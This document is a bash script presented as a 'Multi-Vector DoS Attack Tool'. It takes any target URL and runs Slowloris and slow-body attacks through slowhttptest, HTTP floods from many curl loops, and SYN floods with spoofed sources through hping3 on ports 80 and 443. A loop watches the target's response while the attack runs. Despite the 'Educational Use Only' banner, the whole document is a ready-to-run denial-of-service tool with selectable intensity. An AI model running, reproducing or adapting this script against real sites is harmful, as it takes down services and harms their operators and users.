#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if running as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}[!] This script must be run as root. Use: sudo ./attack.sh${NC}"
   exit 1
fi

# Banner
echo -e "${RED}"
echo "  ___  _    ____ _____ ____    ____  _____ ____ ___  ____ ___ "
echo " / _ \| |  / ___|_   _/ ___|  |  _ \| ____/ ___/ _ \|  _ \_ _|"
echo "| | | | |  \___ \ | | \___ \  | | | |  _|| |  | | | | |_) | | "
echo "| |_| | |___ ___) || |  ___) | | |_| | |__| |__| |_| |  __/| | "
echo " \___/|_____|____/ |_| |____/  |____/|_____\____\___/|_|  |___|"
echo -e "${NC}"
echo -e "${YELLOW}[*] Multi-Vector DoS Attack Tool - Educational Use Only${NC}"
echo -e "${YELLOW}[*] You MUST have explicit permission to test the target!${NC}"
echo ""

# Get target URL
read -p "[?] Enter target URL (e.g., https://example.com): " TARGET

# Validate URL
if [[ -z "$TARGET" ]]; then
    echo -e "${RED}[!] No URL provided. Exiting.${NC}"
    exit 1
fi

# Extract domain from URL
DOMAIN=$(echo "$TARGET" | sed -e 's|^https\?://||' -e 's|/.*$||')
echo -e "${GREEN}[+] Target: $TARGET${NC}"
echo -e "${GREEN}[+] Domain: $DOMAIN${NC}"
echo ""

# Ask for duration
read -p "[?] Attack duration in seconds (default 120): " DURATION
DURATION=${DURATION:-120}

# Ask for intensity
echo "[?] Select intensity:"
echo "    1) Light (500 connections - testing)"
echo "    2) Medium (2000 connections - standard)"
echo "    3) Heavy (5000 connections - aggressive)"
echo "    4) Max (10000 connections - full force)"
read -p "    Choice [1-4] (default 2): " INTENSITY

case $INTENSITY in
    1) CONNS=500; RATE=200; THREADS=50 ;;
    2) CONNS=2000; RATE=500; THREADS=100 ;;
    3) CONNS=5000; RATE=1000; THREADS=200 ;;
    4) CONNS=10000; RATE=2000; THREADS=500 ;;
    *) CONNS=2000; RATE=500; THREADS=100 ;;
esac

echo -e "${YELLOW}[*] Starting attack on $TARGET for ${DURATION}s with intensity level ${INTENSITY:-2}${NC}"
echo -e "${YELLOW}[*] Press 'q' and hit Enter at any time to stop${NC}"
echo ""

# Cleanup function
cleanup() {
    echo -e "\n${YELLOW}[*] Stopping all attacks...${NC}"
    pkill -f slowhttptest 2>/dev/null
    pkill -f "curl.*$DOMAIN" 2>/dev/null
    pkill -f hping3 2>/dev/null
    echo -e "${GREEN}[+] All attacks stopped. Site should recover within 60 seconds.${NC}"
    exit 0
}

# Trap cleanup on exit
trap cleanup SIGINT SIGTERM

# Start attacks in background

# Attack 1: Slow Headers (Slowloris)
echo -e "${GREEN}[+] Starting Slowloris attack...${NC}"
slowhttptest -c $CONNS -H -g -o /dev/null -i 30 -r $RATE -t GET -u "$TARGET" -x 24 -p 1 -l $DURATION > /dev/null 2>&1 &

# Attack 2: Slow Body
echo -e "${GREEN}[+] Starting Slow Body attack...${NC}"
slowhttptest -c $((CONNS/2)) -B -g -o /dev/null -i 10 -r $((RATE/2)) -t GET -u "$TARGET" -x 24 -p 1 -l $DURATION > /dev/null 2>&1 &

# Attack 3: HTTP/HTTPS flood with curl
echo -e "${GREEN}[+] Starting HTTP flood...${NC}"
for i in $(seq 1 $THREADS); do
    ( while true; do
        curl -s -o /dev/null -k "$TARGET" --connect-timeout 5 2>/dev/null
        curl -s -o /dev/null -k "$TARGET/$(date +%s%N)" --connect-timeout 5 2>/dev/null
    done ) &
done

# Attack 4: hping3 SYN flood (if available)
if command -v hping3 &> /dev/null; then
    echo -e "${GREEN}[+] Starting SYN flood on port 443...${NC}"
    sudo hping3 -S --flood -p 443 --rand-source "$DOMAIN" > /dev/null 2>&1 &
    echo -e "${GREEN}[+] Starting SYN flood on port 80...${NC}"
    sudo hping3 -S --flood -p 80 --rand-source "$DOMAIN" > /dev/null 2>&1 &
else
    echo -e "${YELLOW}[!] hping3 not found, skipping SYN flood${NC}"
fi

# Monitor thread
echo -e "${YELLOW}[*] Monitoring attack...${NC}"
(
    START_TIME=$(date +%s)
    while true; do
        CURRENT_TIME=$(date +%s)
        ELAPSED=$((CURRENT_TIME - START_TIME))
        
        if [[ $ELAPSED -ge $DURATION ]]; then
            echo -e "\n${YELLOW}[*] Attack duration reached${NC}"
            cleanup
        fi
        
        # Check site status
        HTTP_CODE=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 3 "$TARGET" 2>/dev/null)
        RESPONSE_TIME=$(curl -s -o /dev/null -w "%{time_total}" --connect-timeout 3 "$TARGET" 2>/dev/null)
        
        echo -n -e "\r[${ELAPSED}s] HTTP: $HTTP_CODE | Time: ${RESPONSE_TIME}s | PID: $$ "
        
        # Check for 'q' input
        read -t 5 -n 1 input 2>/dev/null
        if [[ $input == "q" ]]; then
            echo -e "\n${YELLOW}[*] User requested stop${NC}"
            cleanup
        fi
        
        # Check if slowhttptest finished
        if ! pgrep -f slowhttptest > /dev/null; then
            echo -e "\n${YELLOW}[*] slowhttptest finished${NC}"
            cleanup
        fi
    done
)

# Wait for attacks to finish
wait
cleanup